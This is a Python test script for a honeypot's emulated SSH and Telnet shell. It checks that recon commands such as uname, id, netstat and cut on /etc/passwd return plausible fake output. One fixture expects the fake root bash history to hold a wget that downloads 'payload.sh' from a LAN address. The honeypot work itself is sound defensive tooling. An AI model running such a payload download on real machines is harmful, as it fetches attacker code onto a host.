"""Recon facade integration tests — SSH + Telnet only.

Drives decide_response directly (as the existing response_engine tests do)
so the shell adapters are not started; the point is to prove that every new
command returns the right output and status for both protocols.
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from shared.response_engine import decide_response, ResponsePlan
from shared.filesystem import FakeFilesystem

fs = FakeFilesystem()
ROOT = "/root"
HOME = "/home/antony"

def check(protocol, cmd, params, label, expected_content, expected_type, expected_status="0"):
        r = decide_response(protocol, "sid", cmd, params, fs)
        ok = True
        if expected_type and r.response_type != expected_type:
            print(f"FAIL {label}: type {r.response_type!r} != {expected_type!r}")
            ok = False
        if expected_status is not None and r.status != expected_status:
            print(f"FAIL {label}: status {r.status!r} != {expected_status!r}")
            ok = False
        if expected_content is not None:
            needle = expected_content if isinstance(expected_content, str) else ""
            hay = r.content or ""
            if needle not in hay:
                print(f"FAIL {label}: expected {expected_content!r} in output:\n{hay}")
                ok = False
        if ok:
            print(f"OK   {label}")
        return ok


def cd_or_root(params):
    return {"args": ["-la"], "cwd": params.get("cwd", ROOT)}

ok = True
ok &= check("ssh", "hostname", {"args": ["-f"], "cwd": ROOT}, "hostname",
                "honeypot", "command_output"
)
ok &= check("telnet", "uname", {"args": ["-a"], "cwd": ROOT}, "uname -a (telnet)",
                "Linux honeypot 5.15.0-105-generic", "command_output"
)
ok &= check("ssh", "whoami", {"args": [], "cwd": ROOT}, "whoami",
                "root", "command_output"
)
ok &= check("ssh", "id", {"args": []}, "id",
                "uid=0(root) gid=0(root) groups=0(root)", "command_output"
)
ok &= check("ssh", "uptime", {"args": []}, "uptime",
                "up 2 days", "command_output"
)
ok &= check("ssh", "date", {"args": ["+%Y-%m-%d"], "cwd": ROOT}, "date +%Y-%m-%d",
                "2026", "command_output"
)
ok &= check("ssh", "who", {"args": [], "cwd": ROOT}, "who",
                "root     pts/0", "command_output"
)
ok &= check("ssh", "last", {"args": ["-n", "3"], "cwd": ROOT}, "last -n 3",
                "wtmp begins", "command_output"
)
ok &= check("ssh", "w", {"args": [], "cwd": ROOT}, "w",
                "USER     TTY      FROM", "command_output"
)
ok &= check("ssh", "nl", {"args": [], "cwd": ROOT}, "nl (no args)",
                "", "command_output", "0"
)
ok &= check("ssh", "yes no", {"args": ["no"], "cwd": ROOT}, "yes no",
            "no", "command_output")
ok &= check("ssh", "yes", {"args": [], "cwd": ROOT}, "yes (no args)",
            "y", "command_output")
ok &= check("ssh", "seq 1 2 5", {"args": ["1", "2", "5"], "cwd": ROOT}, "seq 1 2 5",
            "1\n3\n5", "command_output")
ok &= check("ssh", "awk '{print $1}'", {"args": ["'{print", "$1}'"], "cwd": ROOT}, "awk",
            "", "command_output")
ok &= check("ssh", "basename /foo/bar.txt", {"args": ["/foo/bar.txt"], "cwd": ROOT},
            "basename /foo/bar.txt", "bar.txt", "command_output")
ok &= check("ssh", "dirname /foo/bar.txt", {"args": ["/foo/bar.txt"], "cwd": ROOT},
            "dirname /foo/bar.txt", "/foo", "command_output")
ok &= check("ssh", "mkdir -p /tmp/x", {"args": ["-p", "/tmp/x"], "cwd": ROOT},
            "mkdir -p /tmp/x", "", "command_output")
ok &= check("ssh", "touch /tmp/z", {"args": ["/tmp/z"], "cwd": ROOT}, "touch /tmp/z",
            "", "command_output")
ok &= check("ssh", "rm /tmp/z", {"args": ["/tmp/z"], "cwd": ROOT}, "rm /tmp/z",
            "", "command_output")
ok &= check("ssh", "tee", {"args": [], "cwd": ROOT}, "tee (no args)",
            "missing file operand", "command_not_found", "127")
ok &= check("ssh", "tail -n 2 /root/.bash_history", {"args": ["-n", "2", "/root/.bash_history"], "cwd": ROOT},
                "tail -n 2 /root/.bash_history", "wget http://192.168.1.100/payload.sh", "command_output", "0"
)
ok &= check("ssh", "head -n 1 /root/.bash_history", {"args": ["-n", "1", "/root/.bash_history"], "cwd": ROOT},
                "head -n 1 /root/.bash_history", "ls -la", "command_output", "0"
)
ok &= check("ssh", "sort /root/.bash_history", {"args": ["/root/.bash_history"], "cwd": ROOT},
                "sort /root/.bash_history", "cd /tmp", "command_output"
)
ok &= check("ssh", "uniq /root/.bash_history", {"args": ["/root/.bash_history"], "cwd": ROOT},
                "uniq /root/.bash_history", "ls -la", "command_output"
)
ok &= check("ssh", "wc /root/.bash_history", {"args": ["/root/.bash_history"], "cwd": ROOT},
                "wc /root/.bash_history", "4", "command_output"
)
ok &= check("ssh", "cut -d: -f1 /etc/passwd", {"args": ["-d:", "-f1", "/etc/passwd"], "cwd": ROOT},
                "cut -d: -f1 /etc/passwd", "root", "command_output"
)
ok &= check("ssh", "dd if=/etc/passwd of=/dev/null", {"args": ["if=/etc/passwd", "of=/dev/null"], "cwd": ROOT},
                "dd", "records in", "command_output", "0"
)
ok &= check("ssh", "du -sh /root", {"args": ["-sh", "/root"], "cwd": ROOT},
                "du -sh /root", "/root", "command_output"
)
ok &= check("ssh", "lscpu", {"args": [], "cwd": ROOT}, "lscpu",
                "Architecture", "command_output"
)
ok &= check("ssh", "lsblk", {"args": [], "cwd": ROOT}, "lsblk",
                "NAME", "command_output"
)
ok &= check("ssh", "ss -tuln", {"args": ["-tuln"], "cwd": ROOT}, "ss -tuln",
                "State", "command_output"
)
ok &= check("ssh", "netstat -tuln", {"args": ["-tuln"], "cwd": ROOT}, "netstat -tuln",
                "Active Internet connections", "command_output"
)
ok &= check("ssh", "lsof -i :22", {"args": ["-i", ":22"], "cwd": ROOT}, "lsof -i :22",
                "COMMAND", "command_output"
)
ok &= check("ssh", "find /root -name flag.txt", {"args": ["/root", "-name", "flag.txt"], "cwd": ROOT},
                "find /root -name flag.txt", "/root/flag.txt", "command_output", "0"
)
ok &= check("ssh", "file /bin/bash", {"args": ["/bin/bash"], "cwd": ROOT},
            "file /bin/bash", "ELF", "command_output")

ok &= check("ssh", "stat /root/flag.txt", {"args": ["/root/flag.txt"], "cwd": ROOT},
                "stat /root/flag.txt", "File: /root/flag.txt", "command_output", "0"
)
ok &= check("ssh", "mount", {"args": [], "cwd": ROOT},
                "mount",
                "/dev/sda1", "command_output", "0"
)
ok &= check("ssh", "chmod 600 /root/flag.txt", {"args": ["600", "/root/flag.txt"], "cwd": ROOT},
                "chmod", "", "command_output"
)
ok &= check("ssh", "chown root:root /root/flag.txt", {"args": ["root:root", "/root/flag.txt"], "cwd": ROOT},
                "chown", "", "command_output"
)
ok &= check("ssh", "ln -s /root/flag.txt /tmp/fl", {"args": ["-s", "/root/flag.txt", "/tmp/fl"], "cwd": ROOT},
                "ln -s", "", "command_output"
)
ok &= check("ssh", "rmdir /tmp/x", {"args": ["/tmp/x"], "cwd": ROOT},
                "rmdir /tmp/x", "", "command_output"
)
ok &= check("ssh", "realpath /etc/passwd", {"args": ["/etc/passwd"], "cwd": ROOT},
                "realpath /etc/passwd", "/etc/passwd", "command_output"
)
ok &= check("ssh", "type bash", {"args": ["bash"], "cwd": ROOT},
                "type bash", "/bin/bash", "command_output"
)
ok &= check("ssh", "which bash", {"args": ["bash"], "cwd": ROOT},
                "which bash", "/bin/bash", "command_output"
)
ok &= check("ssh", "strings /bin/ls", {"args": ["/bin/ls"], "cwd": ROOT},
                "strings /bin/ls", "ELF", "command_output"
)
ok &= check("ssh", "base64 /etc/hostname", {"args": ["/etc/hostname"], "cwd": ROOT},
                "base64 /etc/hostname", "REPLACE_BASE64", "command_output"
)
ok &= check("ssh", "openssl rand -hex 4", {"args": ["rand", "-hex", "4"], "cwd": ROOT},
            "openssl", "a1b2c3d4e5f60718", "command_output")
ok &= check("ssh", "systemctl status sshd", {"args": ["status", "sshd"], "cwd": ROOT},
            "systemctl status sshd", "sshd.service", "command_output")
ok &= check("ssh", "service ssh status", {"args": ["ssh", "status"], "cwd": ROOT},
            "service ssh status", "Active: active", "command_output")
ok &= check("ssh", "coredumpctl list", {"args": [], "cwd": ROOT},
            "coredumpctl list", "TEM", "command_output")

ok &= check("telnet", "bash --version", {"args": ["--version"], "cwd": ROOT},
                "bash --version", "GNU bash", "command_output"
)
ok &= check("ssh", "python3 --version", {"args": ["--version"], "cwd": ROOT},
                "python3 --version", "Python 3.11.8", "command_output"
)
ok &= check("ssh", "pip3 list", {"args": ["list"], "cwd": ROOT},
                "pip3 list", "Package    Version", "command_output"
)
ok &= check("ssh", "perl -e 1", {"args": ["-e", "1"], "cwd": ROOT},
                "perl -e 1", "Can't locate", "command_output"
)
ok &= check("ssh", "ruby -e 1", {"args": ["-e", "1"], "cwd": ROOT},
                "ruby -e 1", "syntax error", "command_output"
)
ok &= check("ssh", "gcc -o x x.c", {"args": ["-o", "x", "x.c"], "cwd": ROOT},
            "gcc -o x x.c", "no input files", "command_output", "127")
ok &= check("ssh", "make", {"args": [], "cwd": ROOT},
            "make", "No targets specified", "command_output", "127")
ok &= check("ssh", "node -e 1", {"args": ["-e", "1"], "cwd": ROOT},
            "node -e 1", "command not found", "command_not_found", "127")
ok &= check("ssh", "g++ -o x x.cpp", {"args": ["-o", "x", "x.cpp"], "cwd": ROOT},
            "g++ -o x x.cpp", "no input files", "command_output", "127")
ok &= check("ssh", "make -n", {"args": ["-n"], "cwd": ROOT},
            "make -n", "No targets specified", "command_output", "127")
ok &= check("ssh", "cmake", {"args": [], "cwd": ROOT},
            "cmake", "cmake: command not found", "command_not_found", "127")
ok &= check("ssh", "cargo --version", {"args": ["--version"], "cwd": ROOT},
            "cargo --version", "command not found", "command_not_found", "127")
ok &= check("ssh", "npm --version", {"args": ["--version"], "cwd": ROOT},
            "npm --version", "command not found", "command_not_found", "127")
ok &= check("ssh", "yarn --version", {"args": ["--version"], "cwd": ROOT},
            "yarn --version", "command not found", "command_not_found", "127")
ok &= check("ssh", "pnpm --version", {"args": ["--version"], "cwd": ROOT},
            "pnpm --version", "command not found", "command_not_found", "127")
ok &= check("ssh", "gradle --version", {"args": ["--version"], "cwd": ROOT},
            "gradle --version", "command not found", "command_not_found", "127")
ok &= check("ssh", "maven --version", {"args": ["--version"], "cwd": ROOT},
            "maven --version", "command not found", "command_not_found", "127")



if ok:
        print("\nALL RECON TESTS PASSED")
else:
        print("\nSOME RECON TESTS FAILED")
        sys.exit(1)
